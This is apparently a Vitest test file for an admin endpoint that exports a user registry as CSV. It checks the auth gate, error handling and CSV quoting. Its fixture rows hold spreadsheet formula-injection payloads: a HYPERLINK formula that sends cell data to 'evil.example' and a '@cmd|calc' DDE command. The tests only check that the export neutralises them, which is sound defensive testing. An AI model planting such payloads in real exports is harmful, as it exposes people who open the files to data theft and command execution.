import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { DELETE, GET, PATCH, POST, PUT } from '@/app/api/admin/users/route';
import { ADMIN_TOKEN_ENV } from '@/lib/api/auth';
import { resetRateLimiter } from '@/lib/api/rate-limit';
import { query } from '@/lib/db';

vi.mock('@/lib/db', () => ({
  query: vi.fn(),
}));

const queryMock = query as unknown as ReturnType<typeof vi.fn>;

const TOKEN = 'test-admin-token-3a91f2';
const WALLET = `G${'C'.repeat(55)}`;

let ipCounter = 0;

/** A GET carrying `headers`, from a fresh address per call. */
function get(headers: Record<string, string> = {}): Request {
  ipCounter += 1;
  return new Request('https://docs.zentra.dev/api/admin/users', {
    headers: {
      'x-real-ip': `10.7.${Math.floor(ipCounter / 200)}.${ipCounter % 200}`,
      ...headers,
    },
  });
}

/** The bearer credential a legitimate operator sends. */
function bearer(token: string): Record<string, string> {
  return { authorization: `Bearer ${token}` };
}

beforeEach(() => {
  resetRateLimiter();
  vi.stubEnv(ADMIN_TOKEN_ENV, TOKEN);
  vi.spyOn(console, 'log').mockImplementation(() => undefined);
  vi.spyOn(console, 'warn').mockImplementation(() => undefined);
  vi.spyOn(console, 'error').mockImplementation(() => undefined);
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
  queryMock.mockReset();
});

describe('GET /api/admin/users gate ordering', () => {
  it('answers 503 when no token is configured, before any query runs', async () => {
    vi.stubEnv(ADMIN_TOKEN_ENV, '');

    // Even a correct-looking credential cannot open an ungated box.
    const response = await GET(get(bearer(TOKEN)));
    const body = await response.json();

    expect(response.status).toBe(503);
    expect(body.error.code).toBe('upstream_unavailable');
    expect(body.error.message).toBe('Admin access is not configured.');
    expect(queryMock).not.toHaveBeenCalled();
  });

  it('answers 401 for a missing credential, before any query runs', async () => {
    const response = await GET(get());
    const body = await response.json();

    expect(response.status).toBe(401);
    expect(body.error.code).toBe('unauthorized');
    expect(queryMock).not.toHaveBeenCalled();
  });

  it('answers 403 for a wrong credential, before any query runs', async () => {
    const response = await GET(get(bearer('not-the-token')));
    const body = await response.json();

    expect(response.status).toBe(403);
    expect(body.error.code).toBe('forbidden');
    expect(queryMock).not.toHaveBeenCalled();
  });

  it('never reflects the supplied credential in any denial body', async () => {
    const supplied = 'guessed-secret-value';
    const response = await GET(get(bearer(supplied)));

    expect(await response.text()).not.toContain(supplied);
  });
});

describe('GET /api/admin/users export', () => {
  const ROWS = [
    {
      name: '=HYPERLINK("http://evil.example/?x="&A1,"click")',
      email: 'ada@example.com',
      wallet: WALLET,
      rating: 5,
      note: 'loves "quotes", commas\nand newlines',
      source: 'site',
      created_at: new Date('2026-01-02T03:04:05.000Z'),
    },
    {
      name: '@cmd|calc',
      email: 'b@example.com',
      wallet: WALLET,
      rating: null,
      note: null,
      source: 'form',
      created_at: new Date('2026-02-03T04:05:06.789Z'),
    },
  ];

  it('streams the registry as a CSV download with the fixed column set', async () => {
    queryMock.mockImplementation(() => Promise.resolve(ROWS));

    const response = await GET(get(bearer(TOKEN)));
    const csv = await response.text();
    const lines = csv.split('\r\n');

    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toBe('text/csv; charset=utf-8');
    expect(response.headers.get('content-disposition')).toBe(
      'attachment; filename="zentra-users.csv"',
    );
    expect(response.headers.get('cache-control')).toBe('no-store');
    expect(lines[0]).toBe('name,email,wallet,rating,note,source,created_at');
    expect(lines).toHaveLength(3);
  });

  it('defuses spreadsheet formula prefixes with a literal-text quote', async () => {
    queryMock.mockImplementation(() => Promise.resolve(ROWS));

    const response = await GET(get(bearer(TOKEN)));
    const csv = await response.text();
    const lines = csv.split('\r\n');

    // The payload only becomes code when an operator opens the file; the
    // leading apostrophe tells every spreadsheet the cell is literal text.
    expect(lines[1]?.startsWith(`"'=HYPERLINK(`)).toBe(true);
    expect(lines[2]?.startsWith(`'@cmd|calc,`)).toBe(true);
    for (const line of lines) {
      expect(line.startsWith('=')).toBe(false);
      expect(line.startsWith('@')).toBe(false);
    }
  });

  it('quotes per RFC 4180: embedded quotes doubled, commas and newlines contained', async () => {
    queryMock.mockImplementation(() => Promise.resolve(ROWS));

    const response = await GET(get(bearer(TOKEN)));
    const csv = await response.text();

    expect(csv).toContain('"loves ""quotes"", commas\nand newlines"');
    // The embedded newline stayed inside its quotes: the record separator is
    // CRLF, so the document still splits into exactly three records.
    expect(csv.split('\r\n')).toHaveLength(3);
  });

  it('writes timestamps as ISO 8601 and absent values as empty fields', async () => {
    queryMock.mockImplementation(() => Promise.resolve(ROWS));

    const response = await GET(get(bearer(TOKEN)));
    const csv = await response.text();
    const lines = csv.split('\r\n');

    expect(csv).toContain('2026-01-02T03:04:05.000Z');
    expect(csv).toContain('2026-02-03T04:05:06.789Z');
    // rating and note are null on the second row: empty fields, not "null".
    expect(lines[2]).toContain(`${WALLET},,,form`);
    expect(csv).not.toContain('null');
    expect(csv).not.toContain('undefined');
  });

  it('exports an empty registry as just the header row', async () => {
    queryMock.mockImplementation(() => Promise.resolve([]));

    const response = await GET(get(bearer(TOKEN)));

    expect(response.status).toBe(200);
    expect(await response.text()).toBe('name,email,wallet,rating,note,source,created_at');
  });

  it('maps a storage failure to a 503 that leaks nothing', async () => {
    queryMock.mockImplementation(() =>
      Promise.reject(new Error('connect failed postgres://user:pw@host/db')),
    );

    const response = await GET(get(bearer(TOKEN)));
    const text = await response.text();

    expect(response.status).toBe(503);
    expect(text).not.toContain('postgres');
    expect(JSON.parse(text).error.message).toBe('Registry storage is temporarily unavailable.');
  });
});

describe('unsupported methods on /api/admin/users', () => {
  it('answers POST, PUT, PATCH and DELETE with an enveloped 405 naming GET', async () => {
    for (const handler of [POST, PUT, PATCH, DELETE]) {
      const response = await handler(new Request('https://docs.zentra.dev/api/admin/users'));
      const body = await response.json();

      expect(response.status).toBe(405);
      expect(response.headers.get('allow')).toBe('GET');
      expect(body.error.code).toBe('method_not_allowed');
    }
  });
});
